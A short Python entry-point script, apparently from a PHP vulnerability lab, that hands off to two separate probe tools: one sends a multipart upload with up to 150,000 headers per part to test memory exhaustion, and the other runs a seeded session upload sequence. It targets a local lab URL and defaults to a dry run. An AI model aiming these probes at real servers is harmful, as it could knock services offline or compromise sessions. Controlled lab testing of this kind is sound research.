#!/usr/bin/env python3
"""Compatibility entry point for the maintained, bounded PHP CVE lab probes.

109618 delegates to attacker.py's multipart parser candidate. 109619 delegates
to session_progress_probe.py's seeded Session A->B sequence. Neither HTTP
errors nor worker PID changes alone prove the underlying vulnerability.
"""

import argparse
from pathlib import Path
import sys


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("mode", choices=("109618", "109619"))
    parser.add_argument("--base-url", default="http://127.0.0.1:8088",
                        help="HTTP(S) lab URL, optionally with an application path")
    parser.add_argument("--part-headers", type=int, default=150000,
                        help="109618: custom headers in one multipart part (1..150000)")
    parser.add_argument("--pad-bytes", type=int, default=6 * 1024 * 1024,
                        help="109619: ordinary form-field padding bytes in producer A")
    parser.add_argument("--expected-php", default="8.5.11")
    parser.add_argument("--timeout", type=float, default=15.0)
    parser.add_argument("--ca-file", type=Path)
    parser.add_argument("--report", type=Path)
    parser.add_argument("--run", action="store_true",
                        help="Execute the one-shot probe; default is a dry run")
    args = parser.parse_args()
    if not 1 <= args.part_headers <= 150000:
        parser.error("--part-headers must be 1..150000")
    if args.pad_bytes < 1:
        parser.error("--pad-bytes must be >= 1")

    if args.mode == "109618":
        import attacker
        entry_point = attacker.main
        delegated = ["attacker.py", "109618", "--target", args.base_url,
                     "--health", "oom/health.php", "--upload", "oom/upload.php",
                     "--part-headers", str(args.part_headers),
                     "--expected-php", args.expected_php]
    else:
        import session_progress_probe
        entry_point = session_progress_probe.main
        delegated = [
            "session_progress_probe.py", "--target", args.base_url,
            "--health", "session/health.php",
            "--seed", "session/session-seed.php",
            "--producer", "session/upload.php",
            "--consumer", "session/upload.php",
            "--pad-bytes", str(args.pad_bytes),
            "--expected-php", args.expected_php,
        ]
    delegated.extend(["--timeout", str(args.timeout)])
    if args.ca_file:
        delegated.extend(["--ca-file", str(args.ca_file)])
    if args.report:
        delegated.extend(["--report", str(args.report)])
    if args.run:
        delegated.append("--execute")

    original_argv = sys.argv
    try:
        sys.argv = delegated
        entry_point()
    finally:
        sys.argv = original_argv


if __name__ == "__main__":
    main()
